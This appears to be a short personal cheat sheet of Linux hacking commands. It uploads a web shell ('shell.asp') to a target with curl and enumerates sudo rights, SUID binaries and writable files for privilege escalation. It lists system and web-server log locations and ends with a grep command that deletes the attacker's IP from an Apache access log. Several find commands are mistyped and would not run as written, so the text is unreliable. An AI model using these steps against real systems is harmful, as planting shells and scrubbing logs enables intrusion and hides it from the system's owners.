---
tags: 🔻 🔻/OS/linux
aliases: Hacking Notes
---

#curl url upload file  
curl *http://ip* --upload-file shell.asp  
  
# Sudo Check
#sudocheck #privesc #shell 

sudo -l
{check what the user can run as sudo}
  
# SUID 
#suid_permissions
{check what suid have what permissions}

find / -perm -4000 -type f 2>/dev/null  
  
### writable permission  

find / perm /u=w -user \`whoami\` 2>/dev/null  
find / -perm /u+w,g+w -f -user \`whoami\` 2>/dev/null  
find / -perm /u+w -user \`whoami\` 2>/dev/nul  
  
  


## Find files with SUID permission for current user

    
find / perm /u=s -user \`whoami\` 2>/dev/null  
find / -user root -perm -4000 -print 2>/dev/null  
  
### open permission  

find / -perm -777 -type f 2>/dev/null  

  
### log files  

/var/log/messages  
/var/logs  
/var/log/auth.log  
/var/log/apache2/access.log  
/var/log/apache2/error.log  
grep -v '*src-ip-address*' /path/to/access\_log > a && mv a /path/to/access\_log